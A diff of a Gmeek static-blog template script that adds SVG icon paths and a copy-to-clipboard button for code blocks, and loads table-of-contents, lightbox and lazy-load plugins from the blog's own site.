+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -1108,7 +1075,70 @@ function iFrameLoading(){
     }
 }
 
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
 
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
